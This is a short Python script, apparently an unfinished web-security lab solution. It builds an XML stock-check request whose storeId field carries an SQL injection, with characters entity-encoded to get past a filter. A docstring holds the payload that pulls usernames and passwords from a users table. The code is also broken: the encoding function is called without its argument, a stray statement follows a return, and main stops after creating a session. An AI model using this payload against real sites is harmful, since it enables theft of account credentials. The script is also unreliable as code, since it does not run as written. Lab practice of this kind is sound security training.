import sys
import logging
import urllib3

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


LOOK_UP = {
    " ": "&#x20;",
    "'": "&#x27;",
    "U": "&#x55;",
    "S": "&#x53;",
    "-": "&#x2d;",
}


def format_query(query):
    formatted_query = []
    for char in query:
        if char in LOOK_UP:
            char = LOOK_UP[char]
        formatted_query.append(char)
    return "".join(formatted_query)
    pass

def format_payload(query):
    formatted_query = format_query()
    return f'''
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1{formatted_query} </storeId></stockCheck>
'''
    """
    &#x55;NION &#x53;ELECT username || &#x27;~&#x27; || password &#x46;ROM users&#x2d;&#x2d;
    """

def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    shop
    
    
if __name__ == "__main__":
    args=utils.parse_args_collab(sys.argv)
    main(args)